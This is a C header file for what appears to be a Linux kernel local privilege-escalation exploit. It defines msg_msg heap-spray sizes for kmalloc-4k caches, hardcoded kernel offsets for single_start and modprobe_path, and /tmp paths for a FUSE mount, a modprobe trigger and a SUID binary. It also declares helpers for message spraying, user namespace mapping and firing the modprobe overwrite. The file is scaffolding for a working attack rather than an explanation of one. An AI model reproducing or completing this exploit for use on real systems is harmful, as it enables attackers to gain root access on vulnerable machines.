#ifndef UTILS_H
#define UTILS_H
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <unistd.h>

#include "fuse-handlers.h"

// FAKE_SIZE = MSG_SIZE + 8
#define FAKE_SIZE 0xff0
#define MSG_COPY        040000

// N_SPRAY_MSG is optimal size for kmalloc-4k caches, since they have 8 pages
#define N_SPRAY_MSG 16
// MSG_SIZE = 0x1000 - 0x30 + 0x20 - 8
//          = (size of kmalloc-4k object) - (msg_msg header size) + (size of kmalloc-32 object)
//            - (msg_msgseg header size)
#define MSG_SIZE 0xfe8
#define SINGLE_START_OFFSET 0x8134d140  // this needs to be changed according to the kernel used
#define MODPROBE_PATH_OFFSET 0x82c6c280  // this needs to be changed according to the kernel used
#define FUSE_ROOT "/tmp/fusefs"
#define COMPILE_SUID "/tmp/compile_suid"
#define MODPROBE_TRIGGER "/tmp/modprobe_trigger"
#define SUID_SRC "/tmp/suid.c"
#define SUID "/tmp/suid"

#define INFO(format, ...) printf("[+] " format "\n", ##__VA_ARGS__)
#define ERROR(format, ...) printf("[!] [%s] " format "\n", __func__, ##__VA_ARGS__)
#ifdef DEBUG
#define LOG(format, ...) printf("[-] [%s] " format "\n", __func__, ##__VA_ARGS__)
#else
#define LOG(message, ...)
#endif

typedef struct {
    long mtype;
    char mtext[FAKE_SIZE];
} msgbuf;

struct thread_func_args {
    int index;
    size_t msg_len;
};

void assign_to_core(int core_id);

int spray_msg(int n_spray, int msg_size, int *qids, unsigned int qids_offset);

int spray_msg_threaded(int n_spray, int msg_size, pthread_t *threads, unsigned int threads_offset, void *func(void *));

void unshare_and_map_user(uid_t uid, gid_t gid);

void drop_modprobe_files();

int exec_modprobe_trigger();

void start_fuse();

void fuse_cleanup();

void *send_fuse_msg(void *args);

void wait_for_fuse_signals();

void send_signals_to_fuse();

void info(const char *message);

#endif //UTILS_H
